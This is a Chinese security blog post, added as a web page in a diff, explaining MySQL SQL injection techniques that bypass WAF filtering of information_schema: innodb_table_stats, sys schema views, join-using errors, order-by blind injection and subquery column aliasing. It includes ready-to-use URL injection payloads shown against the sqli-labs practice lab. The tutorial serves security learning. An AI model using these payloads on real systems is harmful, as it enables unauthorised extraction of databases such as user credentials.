@@ -1,0 +1,388 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,SQL注入,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>无列名注入绕过information_schema [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        无列名注入绕过information_schema
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2021-02-21T06:00:25.000Z">
+        2021-02-21
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有时候在进行SQL注入中，WAF会过滤掉information_schema这个库，这对我们进行手注产生了一定的障碍，此时就可以用到无列名注入来绕过。</p>
+<h2 id="0x01-information-schema库"><a href="#0x01-information-schema库" class="headerlink" title="0x01 information_schema库"></a>0x01 information_schema库</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>information_schema是MySQL中自带的一个信息数据库，它提供了访问数据库元数据的方式，其中保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名、表名、字段名、相关的数据类型与访问权限等。</p>
+<p>information_schema数据库中相关表的说明：</p>
+<ul>
+<li>SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表。</li>
+<li>TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</li>
+<li>COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</li>
+<li>STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</li>
+<li>USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</li>
+<li>SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</li>
+<li>TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</li>
+<li>COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</li>
+<li>CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</li>
+<li>COLLATIONS表：提供了关于各字符集的对照信息。</li>
+<li>COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。</li>
+<li>TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</li>
+<li>KEY_COLUMN_USAGE表：描述了具有约束的键列。</li>
+<li>ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</li>
+<li>VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</li>
+<li>TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表</li>
+</ul>
+<h3 id="在SQL注入中的利用"><a href="#在SQL注入中的利用" class="headerlink" title="在SQL注入中的利用"></a>在SQL注入中的利用</h3><p>一般的，在SQL注入中，都是先通过information_schema库来查询MySQL中存在哪些数据库、指定数据库存在哪些表、指定表存在哪些字段等等。</p>
+<p>常规利用方式：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询所有数据库</span></span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询指定数据库存在哪些表</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询指定表存在哪些字段</span></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/1.png" alt=""></p>
+<p>然后，就是根据查询到的表名、列明进行进一步的查询即可得到目标数据。</p>
+<p>但是，在一些WAF中是过滤了information_schema的，此时需要换种方式注入。</p>
+<h2 id="0x02-InnoDb引擎"><a href="#0x02-InnoDb引擎" class="headerlink" title="0x02 InnoDb引擎"></a>0x02 InnoDb引擎</h2><p>从MySQL 5.5.8开始，InnoDB成为其默认存储引擎。而在MySQL 5.6以上的版本中，InnoDb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p>
+<p>在MySQL 5.6版本中，可以使用mysql.innodb_table_stats和mysql.innodb_table_index这两张表来替换information_schema.tables实现注入，但是缺点是没有列名。</p>
+<p>利用示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union select 1,2,(select group_concat(database_name) from mysql.innodb_table_stats)%23</span><br><span class="line">?id=0&apos; union select 1,2,(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())%23</span><br></pre></td></tr></table></figure>
+<p>在本地环境中，MySQL版本为5.7，InnoDB引擎并不是作为默认数据库引擎，自然而然其中这两个表不包含新建立的库和表相关信息了，比较鸡肋：</p>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/17.png" alt=""></p>
+<p>查看MySQL支持及默认的存储引擎：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">engines</span>;</span><br></pre></td></tr></table></figure>
+<p>在MySQL配置文件中添加如下配置开启InnoDb存储引擎：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">default-storage-engine</span>=InnoDB</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-sys库"><a href="#0x03-sys库" class="headerlink" title="0x03 sys库"></a>0x03 sys库</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>在MySQL 5.7中，新增了sys系统数据库，通过这个库可以快速地了解系统的元数据信息。sys库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。</p>
+<p>sys库下有两种表：</p>
+<ul>
+<li>字母开头： 适合人阅读，显示是格式化的数；</li>
+<li><code>x$</code>开头 ： 适合工具采集数据，原始类数据；</li>
+</ul>
+<h3 id="在SQL注入中的利用-1"><a href="#在SQL注入中的利用-1" class="headerlink" title="在SQL注入中的利用"></a>在SQL注入中的利用</h3><p>当information_schema库被WAF过滤后，我们可以使用sys库进行替换利用。</p>
+<h4 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h4><p>schema_auto_increment_columns，该视图的作用简单来说就是用来对表自增ID的监控。</p>
+<p>在设计表时，一般会给一些字段设置自增，而schema_auto_increment_columns视图中保存的就是那些有自增字段的表的数据库相关信息。</p>
+<p>本地环境中保存有security库及其相关表的信息，这是因为这个数据库中这些表的id列都是设置为自增的：</p>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/2.png" alt=""></p>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/3.png" alt=""></p>
+<p>基于这个特性，就能替换information_schema来查询数据库和表了：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询数据库</span></span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_auto_increment_columns;</span><br><span class="line"><span class="comment"># 查询指定数据库的表</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/4.png" alt=""></p>
+<p>但是这里有个明显的不足就是，无法查询指定数据库中某表的列。</p>
+<h4 id="schema-table-statistics-with-buffer和x-schema-table-statistics-with-buffer"><a href="#schema-table-statistics-with-buffer和x-schema-table-statistics-with-buffer" class="headerlink" title="schema_table_statistics_with_buffer和x$schema_table_statistics_with_buffer"></a>schema_table_statistics_with_buffer和x$schema_table_statistics_with_buffer</h4><p>前面的schema_auto_increment_columns对应的是存在自增列的表，但是针对不存在自增列的表的话可以通过本小节的这个视图来实现查询。</p>
+<p>比如本地challenges库的表中并没有含有自增列，但是在schema_table_statistics_with_buffer中能查询：</p>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/5.png" alt=""></p>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/6.png" alt=""></p>
+<p>同理的利用：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询数据库</span></span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_table_statistics_with_buffer;</span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"><span class="comment"># 查询指定数据库的表</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span>;</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/7.png" alt=""></p>
+<p>但是缺陷也是一样的，无法查询指定数据库中某表的列。</p>
+<h2 id="0x04-无列名注入"><a href="#0x04-无列名注入" class="headerlink" title="0x04 无列名注入"></a>0x04 无列名注入</h2><p>前面说的sys库替换information_schema库的使用还存在个不足就是查询不到列，此时就可以利用无列名注入来实现。</p>
+<h3 id="join-…-using-…"><a href="#join-…-using-…" class="headerlink" title="join … using …"></a>join … using …</h3><p>以sqli-labs的环境为例，通过ERROR提示的列名逐个using来爆出其他列名即可：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'0'</span> <span class="keyword">union</span> all <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">as</span> a <span class="keyword">join</span> <span class="keyword">users</span> <span class="keyword">as</span> b)<span class="keyword">as</span> c;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'0'</span> <span class="keyword">union</span> all <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">as</span> a <span class="keyword">join</span> <span class="keyword">users</span> <span class="keyword">as</span> b <span class="keyword">using</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>))<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/8.png" alt=""></p>
+<p>Web端：</p>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/9.png" alt=""></p>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/10.png" alt=""></p>
+<h3 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h3><p>order by用于根据指定的列对结果集进行排序。一般上是从0-9、a-z排序，不区分大小写。</p>
+<p>order by盲注为何可以用于无列名注入呢？看个例子。</p>
+<p>比如当我们需要猜解第三列的内容时，使用order by实例如下：</p>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/11.png" alt=""></p>
+<p>当猜测的值大于当前值时，会返回原来的数据即这里看第二列返回是否正常的username，否则会返回猜测的值。此时我们取临界值根据返回内容的二元组继续逐位猜解即可：</p>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/12.png" alt=""></p>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/13.png" alt=""></p>
+<p>当然，相比之下没有其他无列名注入的方法好用。</p>
+<h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>子查询也能用于无列名注入，主要是结合union select联合查询构造列名再放到子查询中实现。</p>
+<p>使用如下union联合查询，可以给当前整个查询的列分别赋予1、2、3的名字：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/14.png" alt=""></p>
+<p>接着使用子查询就能指定查询刚刚赋予的列名对应的列内容了：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`3`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>)x;</span><br><span class="line"><span class="keyword">select</span> x<span class="number">.3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>)x;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/15.png" alt=""></p>
+<p>在sqli-labs中的利用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union select 1,2,group_concat(`3`) from (select 1,2,3 union select * from users)x;%23</span><br><span class="line">?id=0&apos; union select 1,2,group_concat(x.3) from (select 1,2,3 union select * from users)x;%23</span><br><span class="line">?id=0&apos; union select 1,2,group_concat(x.c) from (select (select 1)a,(select 2)b,(select 3)c union select * from users)x;%23</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/21/无列名注入绕过information-schema/16.png" alt=""></p>
+<h2 id="0x0n-参考"><a href="#0x0n-参考" class="headerlink" title="0x0n 参考"></a>0x0n 参考</h2><p><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a></p>
+<p><a href="https://y4er.com/post/no-column-name-injection/" target="_blank" rel="noopener">一道题引发的无列名注入</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-information-schema库"><span class="toc-text">0x01 information_schema库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在SQL注入中的利用"><span class="toc-text">在SQL注入中的利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-InnoDb引擎"><span class="toc-text">0x02 InnoDb引擎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-sys库"><span class="toc-text">0x03 sys库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介-1"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在SQL注入中的利用-1"><span class="toc-text">在SQL注入中的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sys-schema-auto-increment-columns"><span class="toc-text">sys.schema_auto_increment_columns</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#schema-table-statistics-with-buffer和x-schema-table-statistics-with-buffer"><span class="toc-text">schema_table_statistics_with_buffer和x$schema_table_statistics_with_buffer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-无列名注入"><span class="toc-text">0x04 无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#join-…-using-…"><span class="toc-text">join … using …</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#order-by盲注"><span class="toc-text">order by盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#子查询"><span class="toc-text">子查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0n-参考"><span class="toc-text">0x0n 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2021/02/08/Fastjson系列六——1-2-48-1-2-68反序列化漏洞/" rel="next" title="（安全客首发）Fastjson系列六——1.2.48-1.2.68反序列化漏洞">
+          （安全客首发）Fastjson系列六——1.2.48-1.2.68反序列化漏洞
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2021/02/22/The-Backdoor-Factory工具笔记/" rel="prev" title="The Backdoor Factory工具笔记">
+            The Backdoor Factory工具笔记
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
